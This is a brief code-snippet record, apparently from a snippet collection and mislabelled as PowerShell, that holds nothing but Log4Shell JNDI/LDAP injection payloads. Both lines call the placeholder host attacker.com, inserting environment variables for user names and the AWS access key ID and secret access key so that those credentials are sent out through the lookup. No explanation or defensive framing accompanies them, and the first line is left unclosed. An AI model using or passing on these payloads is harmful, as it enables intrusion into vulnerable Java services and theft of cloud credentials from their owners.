---
id: a3fb0db9-49ab-4d8e-b508-80e0b8b136ee
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:56.742801+00:00'
updated_at: '2023-04-06T03:55:56.746172+00:00'
---

# Code Snippet a3fb0db9

**Language**: Powershell

```powershell
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/

# AWS Access Key
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```
